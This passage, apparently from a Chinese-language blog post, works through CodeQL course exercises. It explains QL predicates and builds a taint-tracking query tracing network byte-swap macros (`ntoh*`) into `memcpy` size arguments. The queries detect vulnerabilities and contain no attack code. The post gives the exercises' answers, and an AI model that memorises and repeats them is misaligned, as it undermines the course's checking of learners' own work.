&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class OneTwoThree extends int &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  OneTwoThree() &amp;#123; // characteristic predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    this = 1 or this = 2 or this = 3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  string getAString() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &amp;quot;One, two or three: &amp;quot; + this.toString()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  predicate isEven() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    this = 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上代码定义了一个名为 &lt;code&gt;OneTwoThree&lt;/code&gt;  的类，继承于 int&lt;br&gt;
 类似于构造函数的部分是 &lt;code&gt;this = 1 or this = 2 or this = 3&lt;/code&gt; &lt;br&gt;
 文档中解释说明这个类中包括了 1,2,3 这三个值&lt;br&gt;
运行以下规则，可以发现 ott 中确实有 1，2，3 这三个值&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; /*from MacroInvocation macInvo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; where macInvo.getMacro().getName().regexpMatch(&amp;quot;ntoh.*&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; select macInvo.getExpr()*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; class OneTwoThree extends int &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    OneTwoThree() &amp;#123; // characteristic predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      this = 1 or this = 2 or 3=this&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string getAString() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      result = &amp;quot;One, two or three: &amp;quot; + this.toString()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    predicate isEven() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      this = 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  from OneTwoThree ott&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  select ott&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;e4a0cc58f70e7e930a95949605394de8.png&#34; alt=&#34;e4a0cc58f70e7e930a95949605394de8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中还有一个熟悉的单词 &lt;code&gt;predicate&lt;/code&gt; &lt;br&gt;
 这个是在类的主体内定义的谓词，是使用变量来限制类中可能的值的逻辑属性&lt;br&gt;
举个例子，运行以下规则，就会得到值 2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class OneTwoThree extends int &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   OneTwoThree() &amp;#123; // characteristic predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     this = 1 or this = 2 or 3=this&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   string getAString() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     result = &amp;quot;One, two or three: &amp;quot; + this.toString()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   predicate isEven() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     this = 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from OneTwoThree ott&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; where ott.isEven()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; select ott&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行截图：&lt;br&gt;
&lt;img src=&#34;b7da8682bac3c07ef7a2d8d41cffc090.png&#34; alt=&#34;b7da8682bac3c07ef7a2d8d41cffc090.png&#34;&gt;&lt;br&gt;
 再更改规则如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class OneTwoThree extends int &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   OneTwoThree() &amp;#123; // characteristic predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     this = 1 or this = 2 or 3=this&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   string getAString() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     result = &amp;quot;One, two or three: &amp;quot; + this.toString()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   predicate isEven() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     this = 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from OneTwoThree ott&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; where ott = 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; select ott&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;他们会得到相同的结果&lt;br&gt;
&lt;img src=&#34;c4bff2b9bd1c95c4becc00965b3a52f4.png&#34; alt=&#34;c4bff2b9bd1c95c4becc00965b3a52f4.png&#34;&gt;&lt;br&gt;
 也就是说 &lt;code&gt;where ott.isEven()&lt;/code&gt;  和 &lt;code&gt;where ott = 2&lt;/code&gt;  做出的是相同的限制&lt;br&gt;
那么我们也就能更好地理解， &lt;code&gt;predicate&lt;/code&gt;  特征是用于限制类中可能值的逻辑属性了&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;string getAString()&lt;/code&gt;  就不必多说，返回一个字符串，其中包含对应值&lt;br&gt;
&lt;img src=&#34;1da4e1a23a80b04ee390a564d069fc2e.png&#34; alt=&#34;1da4e1a23a80b04ee390a564d069fc2e.png&#34;&gt;&lt;br&gt;
 其中我发现一个很神奇事，不知该如何解释&lt;br&gt;
我将代码中 &lt;code&gt;this=1&lt;/code&gt;  改成 &lt;code&gt;1=this&lt;/code&gt;  也会得到一样的结果，没有任何不同或报错&lt;br&gt;
它和赋值语句不同，但好像又具有相似的功能&lt;br&gt;
在对变量做限制时，例如 &lt;code&gt;where ott = 2&lt;/code&gt; ，它就变成了一个符号，用于对两个值进行比较，这里还好理解，因为 sql 语法类似&lt;br&gt;
但是同样在以下代码中&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;predicate isEven() &amp;#123; // member predicate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     this = 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;this=2&lt;/code&gt;  也是用于对两个值进行比较&lt;br&gt;
我认为这是由于 &lt;code&gt;predicate&lt;/code&gt;  带来的改变，使得其中的代码和 &lt;code&gt;where&lt;/code&gt;  后的代码具有相同得到功能&lt;br&gt;
如果有更好的见解，还不忘赐教&lt;/p&gt;
&lt;p&gt;最后来写题&lt;br&gt;
题目给了模板和提示&lt;br&gt;
按照 step8 中的规则进行编写， &lt;code&gt;exists&lt;/code&gt;  第二个参数放上 step8 中的 where 条件&lt;br&gt;
由于 select 由题目给出并为 Expr 的子类，所以我们需要增加一个条件获取宏调用相关表达式&lt;br&gt;
根据以上 &lt;code&gt;exists&lt;/code&gt;  案例可知，我们需要在 &lt;code&gt;mi.getExpr() =&lt;/code&gt;  后面写出他返回值的类型，这样当 &lt;code&gt;mi&lt;/code&gt;  为表达式时，就会被选中&lt;br&gt;
 &lt;code&gt;NetworkByteSwap&lt;/code&gt;  是 &lt;code&gt;Expr&lt;/code&gt;  的子类，因此&lt;/p&gt;
&lt;p&gt;9_class_network_byteswap.ql&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class NetworkByteSwap extends Expr &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NetworkByteSwap() &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        exists(MacroInvocation mi | mi.getMacro().getName().regexpMatch(&amp;quot;ntoh.*&amp;quot;) | mi.getExpr() = this)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from NetworkByteSwap n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select n, &amp;quot;Network byte swap&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;step-10-data-flow-and-taint-tracking-analysis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#step-10-data-flow-and-taint-tracking-analysis&#34;&gt;#&lt;/a&gt; Step 10 - Data flow and taint tracking analysis&lt;/h1&gt;
&lt;p&gt;最后一步，进行数据流分析&lt;/p&gt;
&lt;p&gt;先了解以下我们需要查询的函数背景， &lt;code&gt;ntoh*&lt;/code&gt;  函数会返回一个数，并用于 &lt;code&gt;memcpy&lt;/code&gt;  的第三个参数 &lt;code&gt;size&lt;/code&gt; ，所以我们需要追踪的数据流就是从 &lt;code&gt;ntoh*&lt;/code&gt;  到 &lt;code&gt;memcpy&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在 C/C++ 写网络程序的时候，往往会遇到字节的网络顺序和主机顺序的问题。 这时就可能用到 htons (), ntohl (), ntohs ()，htons () 这 4 个网络字节顺序与本地字节顺序之间的转换函数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;memcpy 指的是 c 和 c++ 使用的内存拷贝函数，memcpy 函数的功能是从源 src 所指的内存地址的起始位置开始拷贝 n 个字节到目标 dest 所指的内存地址的起始位置中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;创建 &lt;code&gt;Config&lt;/code&gt;  类，查找此类的数据流并进行污染点追踪分析&lt;br&gt;
进行数据流分析，我们需要用到，部分代码已经在给出的模板中&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import semmle.code.cpp.dataflow.TaintTracking&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import DataFlow::PathGraph&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们需要写两个 &lt;code&gt;predicate&lt;/code&gt; ，一个是来源 &lt;code&gt;isSource&lt;/code&gt; ，一个是接收器 &lt;code&gt;isSink&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;isSource&lt;/code&gt;  中我们需要查询 &lt;code&gt;ntoh*&lt;/code&gt;  宏定义调用的相关表达式，这一步我们已经在 &lt;code&gt;NetworkByteSwap&lt;/code&gt;  中写过了&lt;br&gt;
 &lt;code&gt;isSink&lt;/code&gt;  中我们需要查询调用 &lt;code&gt;memcpy&lt;/code&gt;  函数时，传入的第三个参数 &lt;code&gt;size&lt;/code&gt; ，这一步我们需要新增加的步骤是获取参数&lt;/p&gt;
&lt;p&gt;弄清楚这些后，在编写规则时，根据提示完善代码&lt;br&gt;
我们就能获得 10_taint_tracking.ql 的答案&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; * @kind path-problem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import semmle.code.cpp.dataflow.TaintTracking&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import DataFlow::PathGraph&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class NetworkByteSwap extends Expr &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NetworkByteSwap() &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        exists(MacroInvocation mi| mi.getMacro().getName().regexpMatch(&amp;quot;ntoh(s|l|ll)&amp;quot;) | this = mi.getExpr())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Config extends TaintTracking::Configuration &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Config() &amp;#123; this = &amp;quot;NetworkToMemFuncLength&amp;quot; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  override predicate isSource(DataFlow::Node source) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // TODO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /*获取与此节点对应的表达式（如果有）。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    此谓词仅在表示表达式求值值的节点上具有结果。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    对于从表达式中流出的数据，例如通过引用传递参数时，请使用asDefiningArgument而不是asExpr。*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    source.asExpr() instanceof NetworkByteSwap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  override predicate isSink(DataFlow::Node sink) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // TODO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exists(FunctionCall fc | fc.getTarget().hasName(&amp;quot;memcpy&amp;quot;) | sink.asExpr() = fc.getArgument(2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Config cfg, 